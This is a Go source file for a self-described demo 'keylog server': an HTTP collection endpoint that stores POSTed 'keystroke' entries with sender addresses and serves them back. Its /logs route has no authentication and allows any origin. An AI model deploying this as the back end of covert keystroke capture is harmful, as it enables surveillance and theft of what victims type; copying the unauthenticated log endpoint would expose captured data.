package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/joho/godotenv"
)

// 🔐 Simulated in-memory storage
var simulatedStorage []map[string]interface{}

func loadEnv() {
	err := godotenv.Load()
	if err != nil {
		log.Println("⚠️ .env file not found (using defaults)")
	}
}

func isAuthorized(r *http.Request) bool {
	return r.Header.Get("X-API-KEY") == os.Getenv("API_KEY") // For demo: set to "demo123"
}

func withCORS(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-API-KEY")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}
		h.ServeHTTP(w, r)
	}
}

func receiveHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthorized(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	logEntry := map[string]interface{}{
		"content":   string(body),
		"type":      "keystroke", // For simplicity
		"timestamp": time.Now(),
		"source":    r.RemoteAddr,
	}

	simulatedStorage = append(simulatedStorage, logEntry)
	log.Printf("✅ Received log from %s", r.RemoteAddr)

	w.WriteHeader(http.StatusOK)
}

func getLogsHandler(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(simulatedStorage)
}

func main() {
	loadEnv()

	http.HandleFunc("/receive", withCORS(receiveHandler))
	http.HandleFunc("/logs", withCORS(getLogsHandler))

	fmt.Println("🚀 Demo keylog server running at http://localhost:8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
